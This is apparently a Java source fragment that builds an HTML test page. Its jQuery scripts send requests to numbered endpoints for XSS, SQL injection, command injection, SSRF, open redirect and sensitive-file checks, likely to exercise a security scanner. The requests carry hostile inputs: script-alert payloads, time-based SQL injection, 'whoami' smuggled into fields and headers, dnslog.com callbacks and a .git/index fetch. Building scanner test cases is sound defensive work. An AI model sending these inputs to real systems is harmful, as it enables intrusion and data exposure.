                "                    cache: false,\n" +
                "                    headers: {\"BS00133\": \"BS00133\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00127\", \"BS00127\", \"1d\", \"/sensitive/BS00127\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00127',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00127\": \"BS00127\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00126\", \"BS00126\", \"1d\", \"/xss/BS00126\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00126',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00126=javascript:alert(1);',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00126\": \"BS00126\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00132\", \"BS00132\", \"1d\", \"/sqli/BS00132\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00132',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00132={\"rs\":{\"BS00132\": \"\\'union select 1, 2, \\'3\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00132\": \"BS00132\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00091\", \"BS00091\", \"1d\", \"/sqli/BS00091?BS00091=foo'%20and%201=1%23\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: \"/sqli/BS00091?BS00091=foo'%20and%201=1%23\",\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00091\": \"BS00091\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00085\", \"BS00085\", \"1d\", \"/ssrf/BS00085\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00085',\n" +
                "                    type: 'DELETE',\n" +
                "                    data: 'BS00085=https://www.alipay.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00052\", \"BS00052\", \"1d\", \"/redirect/BS00052\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00052',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00052=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00052\": \"BS00052\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00046\", \"BS00046\", \"1d\", \"/cmdi/BS00046\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00046',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00046=FOO=whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00046\": \"BS00046\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00009\", \"BS00009\", \"1d\", \"/sqli/BS00009\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00009',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00009=0' and sleep(10) -- -\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00009\": \"BS00009\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00021\", \"BS00021\", \"1d\", \"/cmdi/BS00021\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00021',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00021\": \"BS00021\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00035\", \"BS00035\", \"1d\", \"/cmdi/BS00035\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00035',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00035=FOO=whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00035\": \"BS00035\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00155\", \"BS00155\", \"1d\", \"/xss/BS00155\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>' + '\\n' +' <BS00155><BS00155>' + '\\n' +'&lt;script&gt;alert(1);&lt;/script&gt;' + '\\n' +'</BS00155></BS00155>' + '\\n' +' </root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00155',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00155\": \"BS00155\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00141\", \"BS00141\", \"1d\", \"/ssrf/BS00141?BS00141=http://aaa.www.dnslog.com/123/\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00141?BS00141=http://aaa.www.dnslog.com/123/',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00141\": \"BS00141\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00140\", \"BS00140\", \"1d\", \"/sqli/BS00140?BS00140=bar\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00140?BS00140=bar',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00140\": \"BS00140\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" );
        sb.append(
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00154\", \"BS00154\", \"1d\", \"/ssrf/BS00154\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00154',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00154=ftp://dnslog.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00154\": \"BS00154\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00034\", \"BS00034\", \"1d\", \"/cmdi/BS00034\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00034',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00034=BS00034 %26%26 whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00034\": \"BS00034\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00020\", \"BS00020\", \"1d\", \"/cmdi/BS00020\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00020',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00020\": \"BS00020\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00008\", \"BS00008\", \"1d\", \"/xss/BS00008\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00008',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00008=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00008\": \"BS00008\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00036\", \"BS00036\", \"1d\", \"/cmdi/BS00036\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00036',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00036=FOO=whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00036\": \"BS00036\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00022\", \"BS00022\", \"1d\", \"/cmdi/BS00022\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00022',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00022\": \"BS00022\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00142\", \"BS00142\", \"1d\", \"/sqli/BS00142?BS00142=bar\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00142?BS00142=bar',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00142\": \"BS00142\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00156\", \"BS00156\", \"1d\", \"/xss/BS00156\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00156',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00156=test',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00156\": \"BS00156\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00157\", \"BS00157\", \"1d\", \"/xss/BS00157\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00157',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00157=test',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00157\": \"BS00157\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00126\", \"BS00126\", \"1d\", \"/redirect/BS00143\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00143',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00143=https://www.dnslog.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00126\": \"BS00126\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00023\", \"BS00023\", \"1d\", \"/sqli/BS00023\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00023',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00023\": \"BS00023\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00037\", \"BS00037\", \"1d\", \"/cmdi/BS00037\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00037',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00037=whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00037\": \"BS00037\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" );
        sb.append(
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00033\", \"BS00033\", \"1d\", \"/xss/BS00033\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00033',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00033=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00033\": \"BS00033\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00027\", \"BS00027\", \"1d\", \"/cmdi/BS00027\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00027',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00027\": \"BS00027 && whoami\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00147\", \"BS00147\", \"1d\", \"/sqli/BS00147?BS00147=bar\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00147?BS00147=bar',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00147\": \"BS00147\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00153\", \"BS00153\", \"1d\", \"/sensitive/BS00153\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00153',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00153\": \"BS00153\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00152\", \"BS00152\", \"1d\", \"/sensitive/BS00152/.git/index\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00152/.git/index',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00152\": \"BS00152\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00126\", \"BS00126\", \"1d\", \"/xss/BS00146\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00146',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00146=nothing',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00126\": \"BS00126\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00026\", \"BS00026\", \"1d\", \"/sqli/BS00026\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00026',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00026\": \"1' and (select sleep(10))  or '\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
